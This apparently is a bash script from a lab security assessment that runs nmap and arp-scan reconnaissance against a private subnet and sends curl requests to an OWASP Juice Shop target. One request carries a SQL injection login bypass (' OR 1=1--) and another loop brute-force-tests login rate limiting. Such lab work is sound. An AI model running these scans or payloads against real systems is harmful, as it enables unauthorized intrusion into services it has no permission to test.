#!/bin/bash
# Runs the full baseline scan from clientA and saves evidence to $1 (before/after).
# Must be run from the repo root. Uses the vagrant-user key via bastion for root
# on clientA — that is the setup the methodology documents.

OUT=${1:?usage: run-scans.sh <before|after>}
OUT_DIR="scans/$OUT"
mkdir -p "$OUT_DIR"

SSH_OPTS=(
  -i ./remote_machines_ed25519
  -o IdentitiesOnly=yes
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o LogLevel=ERROR
)
VAG_KEY=.vagrant/machines/clientA/virtualbox/private_key
PROXY="ssh ${SSH_OPTS[*]} -W %h:%p -p 2222 admin1@127.0.0.1"
SSH_CA=(ssh -i "$VAG_KEY" -o IdentitiesOnly=yes -o StrictHostKeyChecking=no
        -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR
        -o ProxyCommand="$PROXY" vagrant@10.10.10.20)

run() {
  local label="$1"; shift
  echo "==> $label"
  "${SSH_CA[@]}" "$@" | tee "$OUT_DIR/$label"
  echo
}

run 01-arp-scan-subnetA.txt \
  'sudo arp-scan --interface=enp0s8 --localnet'

run 02-arp-scan-subnetB-range.txt \
  'sudo arp-scan --interface=enp0s8 10.10.20.1-10.10.20.30'

run 03-nmap-sn-subnetB.txt \
  'sudo nmap -sn -PE 10.10.20.0/24'

run 04-nmap-full-tcp-clientB.txt \
  'sudo nmap -Pn -sS -p- -T4 --min-rate 2000 --open 10.10.20.20'

run 05-nmap-full-tcp-gateway.txt \
  'sudo nmap -Pn -sS -p- -T4 --min-rate 2000 --open 10.10.20.10'

run 06-nmap-sV-sC-clientB.txt \
  'sudo nmap -Pn -sV -sC -p 3000 10.10.20.20'

run 07-nmap-O-clientB.txt \
  'sudo nmap -Pn -O 10.10.20.20'

run 08-curl-version.txt \
  'curl -sS -i http://10.10.20.20:3000/rest/admin/application-version'

run 09-curl-ftp.txt \
  'curl -sS -i http://10.10.20.20:3000/ftp'

run 10-curl-sqli-login.txt \
  "curl -sS -i -X POST http://10.10.20.20:3000/rest/user/login -H 'Content-Type: application/json' --data-raw \"{\\\"email\\\":\\\"' OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\""

run 11-curl-ratelimit.txt \
  'for i in $(seq 1 10); do curl -s -o /dev/null -w "attempt=%{http_code} time=%{time_total}s\n" -X POST http://10.10.20.20:3000/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"wrong$i\"}"; done'

echo "All scans saved under $OUT_DIR/"
